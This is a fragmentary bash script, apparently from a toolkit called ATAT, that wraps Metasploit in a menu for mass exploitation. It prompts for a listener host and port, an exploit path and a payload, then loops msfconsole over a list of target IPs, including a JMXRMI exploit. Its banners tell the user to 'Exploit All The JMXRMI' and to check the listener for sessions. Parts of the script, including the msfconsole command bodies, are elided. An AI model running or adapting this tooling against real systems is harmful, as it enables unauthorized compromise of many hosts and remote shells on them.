...
tput sgr0
echo -e "\E[1;33m:::\e[97m[10]\e[31mMulti-Target JMXRMI \e[97m  [Fire 1 JMXRMI Exploit at Many Targets]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
...
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload;
	inputfile=~/ATAT/Exploit/MultiTarget/MSF_targets.txt
	...
	exit"
            ...
            echo -e "\E[1;33m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions![1;33m:::::"
            ;;
        "Quit")
            echo "Good Bye" && break
            ;;
...
do
	...
	inputfile=~/ATAT/Exploit/MultiPort/MSF_target_ports.txt
...
;;
 ...
 echo -e "\E[1;33m::::: \e[97mExploit All The JMXRMI!!\E[1;33m:::::"
 echo -e "\E[1;33m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;33m:::::"
...
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set JMXRMI: ' userjmxrmi;
	inputfile=~/ATAT/Exploit/MultiTarget/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	...
	exit"
            ...
            echo -e "\E[1;33m::::: \e[97mAll JMXRMI Targets Have Been Tested! Check Your Listener for Sessions!\E[1;33m:::::"
            ;;
        "Quit")
            echo "Good Bye" && break
            ;;
